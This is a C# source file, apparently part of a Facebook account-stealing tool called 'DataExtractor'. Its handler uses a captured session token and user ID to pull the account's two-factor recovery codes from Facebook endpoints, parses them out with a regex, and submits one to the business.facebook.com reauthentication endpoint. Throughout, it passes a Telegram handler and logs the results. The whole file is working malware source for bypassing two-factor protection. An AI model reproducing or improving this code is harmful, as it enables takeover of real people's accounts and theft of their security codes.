using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text.RegularExpressions;
using DataExtractor.Core.Exts;
using DataExtractor.Core.Models;

namespace DataExtractor.Core.Handlers.Fb;

internal class Get2FaCodeHandler
{
	private class AnotherInfo
	{
		public TelegramHandler TelegramHandler { get; set; }

		public HttpClient HttpClient { get; set; }

		public FbData FbData { get; internal set; }
	}

	private readonly List<Func<AnotherInfo, bool>> _funcs = null;

	public Get2FaCodeHandler()
	{
		_funcs = new List<Func<AnotherInfo, bool>> { Export2FaCode };
	}

	private bool TryGet2FaApp(AnotherInfo arg)
	{
		throw new NotImplementedException();
	}

	private bool TryGet2FaCode(AnotherInfo anotherInfo)
	{
		anotherInfo.FbData.Log("Try to get 2fa");
		string formData = "av=" + anotherInfo.FbData.UserId + "&__user=" + anotherInfo.FbData.UserId + "&fb_dtsg=" + WebUtility.UrlEncode(anotherInfo.FbData.Fbdtsg) + "&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=LiveProducerProviderPlatformizationNoBroadcastStatusRefetchQuery&variables=%7B%22params%22%3A%7B%22path%22%3A%22%2Fsecurity%2F2fac%2Fnt%2Ffactors%2Frecovery-code%2F%22%2C%22params%22%3A%22%7B%5C%22reset%5C%22%3Afalse%7D%22%2C%22nt_context%22%3A%7B%22using_white_navbar%22%3Atrue%2C%22styles_id%22%3A%223a8e3d9b0d36d2b1fc0e72b31a5a0a25%22%2C%22pixel_ratio%22%3A3%7D%2C%22extra_client_data%22%3A%7B%7D%7D%2C%22nt_context%22%3A%7B%22using_white_navbar%22%3Atrue%2C%22styles_id%22%3A%223a8e3d9b0d36d2b1fc0e72b31a5a0a25%22%2C%22pixel_ratio%22%3A3%7D%2C%22scale%22%3A%223%22%7D&server_timestamps=true&doc_id=3186065241458684";
		string url = "https://www.facebook.com/api/graphql/";
		string text = anotherInfo.HttpClient.PostString(url, formData, "application/x-www-form-urlencoded", new Dictionary<string, string>
		{
			{ "Sec-Fetch-Dest", "empty" },
			{ "Sec-Fetch-Mode", "cors" },
			{ "Sec-Fetch-Site", "same-origin" }
		});
		anotherInfo.FbData.Log("2fa result : " + text);
		if (string.IsNullOrEmpty(text) || text.Contains("errorSummary"))
		{
			anotherInfo.FbData.Log("Error 2fa");
			return false;
		}
		try
		{
			if (anotherInfo.FbData.Codes == null)
			{
				anotherInfo.FbData.Codes = new Stack<string>();
			}
			Regex regex = new Regex("[0-9]{8}");
			MatchCollection matchCollection = regex.Matches(text);
			foreach (Match item in matchCollection)
			{
				anotherInfo.FbData.Codes.Push(item.Value);
			}
		}
		catch
		{
		}
		return true;
	}

	private bool Export2FaCode(AnotherInfo anotherInfo)
	{
		if (anotherInfo.FbData.Codes.Count > 0)
		{
			return false;
		}
		anotherInfo.FbData.Log("Get 2fa old");
		string url = "https://www.facebook.com/security/2fac/recovery_code/file/";
		string @string = anotherInfo.HttpClient.GetString(url, new Dictionary<string, string>
		{
			{ "Sec-Fetch-Dest", "document" },
			{ "Sec-Fetch-Mode", "navigate" }
		});
		if (string.IsNullOrEmpty(@string))
		{
			anotherInfo.FbData.Log("Khon request duoc");
		}
		else
		{
			if (@string.Contains("html"))
			{
				anotherInfo.FbData.Log("can 2fa code");
				return true;
			}
			anotherInfo.FbData.Log("2fa ok : \n" + @string);
			foreach (string item in from a in @string.Split('\n')
				where !string.IsNullOrEmpty(a)
				select a)
			{
				anotherInfo.FbData.Codes.Push(item.Trim());
			}
		}
		return true;
	}

	internal bool Get2FaCode(HttpClient httpClient, FbData data, TelegramHandler telegramHandler)
	{
		AnotherInfo arg = new AnotherInfo
		{
			HttpClient = httpClient,
			TelegramHandler = telegramHandler,
			FbData = data
		};
		if (data.Codes == null)
		{
			data.Codes = new Stack<string>();
		}
		foreach (Func<AnotherInfo, bool> func in _funcs)
		{
			if (!func(arg))
			{
				break;
			}
		}
		if (data.Codes == null || data.Codes.Count == 0)
		{
			return false;
		}
		return true;
	}

	private void RunFa(Stack<string> codes, FbData fbData, HttpClient httpClient, TelegramHandler telegramHandler)
	{
		if (codes.Count != 0)
		{
			string url = "https://business.facebook.com/security/twofactor/reauth";
			string @string = httpClient.GetString(url);
			if (string.IsNullOrEmpty(@string))
			{
				fbData.Log("cant get data 2fa");
				return;
			}
			string text = @string.CutString("DTSGInitData\",[],{\"token\":\"", "\"");
			string text2 = codes.Pop();
			url = "https://business.facebook.com/security/twofactor/reauth/enter";
			string formData = "approvals_code=" + text2 + "&save_device=false&__user=" + fbData.UserId + "&__a=1&__comet_req=0&fb_dtsg=" + text + "&__jssesw=1";
			@string = httpClient.PostString(url, formData, "application/x-www-form-urlencoded", new Dictionary<string, string> { { "Sec-Fetch-Site", "same-origin" } });
			fbData.Log("telegram log 2fa " + @string);
		}
	}
}
